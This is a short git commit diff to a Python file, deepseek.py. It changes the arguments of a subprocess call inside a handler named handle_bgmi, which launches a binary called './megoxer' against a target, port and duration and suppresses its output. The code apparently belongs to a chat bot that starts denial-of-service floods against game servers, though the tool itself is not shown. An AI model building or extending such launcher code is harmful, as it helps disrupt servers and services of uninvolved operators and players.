464fc301666e9df1323f24308432b0ebcfab703f
sagarVcxBgmi <parulsorout@outlook.com>
2025-02-18 13:03:08 +0530

    Add files via upload

--- deepseek.py
+++ deepseek.py
@@ -262,7 +262,7 @@ def handle_bgmi(message):
     
     try:
         subprocess.Popen(
-            ["./megoxer", target, str(port), str(duration), "900"],
+            ["./megoxer", target, str(port), str(duration)],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
